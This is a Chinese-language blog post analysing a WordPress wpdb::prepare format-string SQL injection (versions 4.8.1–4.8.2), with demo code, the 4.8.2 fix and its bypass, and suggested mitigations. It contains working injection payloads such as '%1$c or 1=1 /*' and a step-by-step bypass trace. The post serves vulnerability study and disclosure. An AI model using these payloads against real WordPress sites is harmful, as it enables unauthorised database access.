---
layout: post
title:  wordpress 格式化字符串注入
date: 2017-11-2
categories: 漏洞分析
tags:  php sql注入
---


* content
{:toc}


## wordpress 格式化字符串注入

wordpress 格式化字符串注入，漏洞利用难度很大，但是格式化字符串注入新颖程度和利用技巧都值得学习，小小分析一波。第一次漏洞在4.8.2被修复，再次被绕过，目前最新版是4.8.3。









## 漏洞分析


### 格式化字符串漏洞小demo

	$items = '%1$c) or 1=1 /*';
	$baz = 39;
	$string_a = "where bar in ('$items') and baz = %s" ;
	$string_a = vsprintf($string_a, $baz);
	echo $string_a;
	
sprintf和vsprintf都允许绝对引用，使用```%n$s```不会去读下一个参数，而是会读第n个占位符的数据，而占位符```%c```像```chr()```类似，把数字转换成字符，39是```'```的ascii码，所以就可以在sql注入中造成单引号逃逸

最后输出结果

	SELECT * FROM foo WHERE bar IN ('') OR 1 = 1 /*' AND baz = 39;

这是一个很惊喜的操作，在wordpress4.8.1源码中有如下源码

	if ( $delete_all ) {
		$value_clause = '';
		if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
			$value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
		}

		$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
	}

现实环境中很难同时控制```$meta_key```和```$value_clause($meta_value)```,所以对这个漏洞进行利用非常困难。为了分析方便，来构造一个类wp的小demo，输出可以进行逃逸的sql语句为成功，注:prepare代码在附录中

	$meta_key = '39';
	$meta_value = '%1$c or 1=1 /*';
	$value_clause = prepare( " AND meta_value = %s", $meta_value );
	$type_column = 'test';
	$table = 'test';
	$string_b = prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key );
	echo $string_b;

最后输出 ```$string_b``` 为 ```SELECT test FROM test WHERE meta_key = '39'  AND meta_value = '' or 1=1 /*'```,一番很理论的操作之后得到的结果。

### 4.8.2代码修复

wordpress 在prepare中添加了过滤代码

	$query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); // escape any unescaped percents 

1. 正则表达式只允许 %d,%s和%F，数字，字符串和浮点数三种类型
2. 使%n$s这种绝对位置不合法

这样修复导致了 大量使用 ```%4s```这样占位符的代码出现问题,(理论上)

	$db->prepare("SELECT * FROM foo WHERE name= '%4s' AND user_id = %d", $_GET['name'], get_current_user_id());

在这样点的代码中```%4s```会成为```%%4s```,```$_GET['name']``` 输出在```user_id = %d```，攻击者控制```user_id```.

绕过

	$meta_key = ['dump', 'or 1=1 /*'];
	$meta_value = ' %s ';

注意meta_value变量值 空格%s空格
	
	1.初始值
	query = "AND meta_value = %s"
	2.经过 $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); 替%s得到'%s'
	query = "AND meta_value = '%s'"
	3.格式化字符串输出vsprintf(query,args); args = ' %s '
	query = "AND meta_value = ' %s '"
	4.拼接字符串"SELECT $type_column FROM $table WHERE meta_key = %s $value_clause"
	query = "SELECT test FROM test WHERE meta_key = %s  AND meta_value = ' %s '"
	5.str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it 原来是将'%s'替换成%s的操作，但是因为' %s '不满足字符串匹配条件
	query = "SELECT test FROM test WHERE meta_key = %s  AND meta_value = ' %s '"
	6.经过正则匹配过滤 $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); 替换%s得到'%s'
	query = "SELECT test FROM test WHERE meta_key = '%s'  AND meta_value = ' '%s' '"
	7.拼接字符串输出vsprintf(query,args); args=['dump', 'or 1=1 /*']
	query= "SELECT test FROM test WHERE meta_key = 'dump'  AND meta_value = ' 'or 1=1 /*' '"

可以看到输出query已经经过了单引号逃逸

### 格式化字符串漏洞分析

vsprintf使用绝对占位符，sprintf和vsprintf具有同样的特性

	vsprintf('%s, %d, %s', ["a", 1, "b"]); // "a, 1, b"
	vsprintf('%s, %d, %1$s', ["a", 2, "b"]); // "a, 2, a"

在参考2中提了另一种单引号逃逸，``` %1$'%s'``` 其中 ```%```构成padding，使```'```逃逸
![](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/wpdb_sql.PNG)


	Example #8 printf(): string specifiers
	
	<?php
	$s = 'monkey';
	$t = 'many monkeys';
	
	printf("[%s]\n",      $s); // standard string output
	printf("[%10s]\n",    $s); // right-justification with spaces
	printf("[%-10s]\n",   $s); // left-justification with spaces
	printf("[%010s]\n",   $s); // zero-padding works on strings too
	printf("[%'#10s]\n",  $s); // use the custom padding character '#'
	printf("[%10.10s]\n", $t); // left-justification but with a cutoff of 10 characters
	?>
	以上例程会输出：
	
	[monkey]
	[    monkey]
	[monkey    ]
	[0000monkey]
	[####monkey]
	[many monke]

## 修复

### 简单修复

不允许用户的输入传入query，构造查询语句，可以构造查询模板

### 缓和修复

使用随机生成占位符替换%,查询之前在替换回来

[wp官方漏洞4.8.3修复代码](https://github.com/WordPress/WordPress/blob/4.8.3/wp-includes/wp-db.php)

## 参考链接

1. [针对wp中sql查询设计存在的不合理和漏洞分析原文](https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html)
2. [404实验室分析](https://paper.seebug.org/386/)

## 附录

	$query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); 
4.8.1及之前，这条语句不存在，4.8.2加入，是一次错误的修复
	
	function prepare( $query, $args ) {
	    if ( is_null( $query ) )
	        return;
	
	    // This is not meant to be foolproof -- but it will catch obviously incorrect usage.
	    if ( strpos( $query, '%' ) === false ) {
	        //_doing_it_wrong( 'wpdb::prepare', sprintf( __( 'The query argument of %s must have a placeholder.' ), 'wpdb::prepare()' ), '3.9.0' );
	        echo $query;
	        echo '\r\n';
	    }
	
	    $args = func_get_args();
	    array_shift( $args );
	    // If args were passed as an array (as in vsprintf), move them up
	    if ( isset( $args[0] ) && is_array($args[0]) )
	        $args = $args[0];
	    $query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it
	    $query = str_replace( '"%s"', '%s', $query ); // doublequote unquoting
	    $query = preg_replace( '|(?<!%)%f|' , '%F', $query ); // Force floats to be locale unaware
	    $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%s
	    //$query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); // escape any unescaped percents
	    array_walk( $args, array( $this, 'escape_by_ref' ) );
	    return @vsprintf( $query, $args );
	}


